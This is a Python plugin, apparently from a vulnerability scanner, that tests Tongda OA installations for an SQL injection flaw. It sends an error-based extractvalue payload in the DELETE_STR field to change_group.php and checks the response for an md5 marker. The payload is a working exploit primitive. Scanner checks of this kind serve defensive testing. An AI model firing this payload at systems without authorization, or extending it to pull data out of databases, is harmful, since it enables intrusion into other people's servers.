#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"general/address/public/address/change_group.php")
        data="DELETE_STR=2) and extractvalue(1, concat(0x5c,(select md5(333) from `user` limit 1))); %23&WEBMAIL_ID_STR=&PAGE_START=0"
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain"}
        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        
        if  content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:tongdasqlscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
    
    return list
#end def